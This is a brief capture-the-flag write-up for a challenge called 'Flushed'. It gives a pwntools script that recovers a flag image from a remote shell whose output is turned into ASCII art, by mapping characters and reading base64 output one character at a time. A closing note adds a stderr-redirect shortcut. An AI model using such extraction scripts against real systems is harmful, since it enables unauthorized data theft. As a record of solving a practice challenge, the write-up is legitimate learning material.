# Flushed

We get a shell, and get the output in large ascii text. There's a PNG of the flag. Here's my script (stupid probably). I got 1/3 of the image and guessed the rest lol

```python
from pwn import *
host = ("jh2i.com", 50015)

import string
mapc = {}

r = remote(*host)

def runCmd(cmd):
    r.clean()
    r.sendline(cmd)
    return r.clean(timeout=0.3).split(b"\r\n")[2:8]


for c in string.printable:
    mapc[c] = runCmd(f"echo '{c}'")

def lookup(val):
    for k, v in mapc.items():
        if v == val:
            return k


def readOutput(cmd):
    template = "expr substr $({}) {} 1"
    output = ""
    pos = 1
    for c in range(1, 9293):
        out = runCmd(template.format(cmd, c))
        char = lookup(out)
        print(char, end='')
        output += char
    return output

print(readOutput("base64 flag.png -w0"))
```
#### Flag:flag{flushed_down_the_toilet_but_rescued_again}
<hr>

### Tony's challenge afterthoughts:


OH MY GOD I COULD HAVE CHEESED IT

ONLY STDOUT IS ASCII-ARTED

SO 

`base64 -w0 flag.png 1>&2`

FUCKING YEAH DOES IT REEEEEEEEEEEEEEEEEEEEEEEEEE
